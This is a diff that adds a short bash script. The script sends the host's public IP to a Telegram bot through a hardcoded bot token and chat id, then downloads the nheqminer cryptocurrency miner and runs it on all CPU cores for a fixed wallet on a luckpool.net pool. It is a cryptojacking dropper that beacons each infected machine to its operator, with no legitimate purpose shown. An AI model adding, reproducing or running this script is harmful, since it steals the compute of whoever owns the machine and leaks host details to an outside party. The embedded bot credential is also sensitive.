@@ -1,0 +1,11 @@
+#!/bin/bash
+
+apt-get install jq -y
+
+myIp="$(wget -qO- ifconfig.me/ip)"
+curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$myIp --compressed
+
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && 
+
+noz="$(nproc)"
+nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RF6mfASq9xHAEt8FxbKahCmQ9AUxZubg38.Soldier -p x --cpu $noz
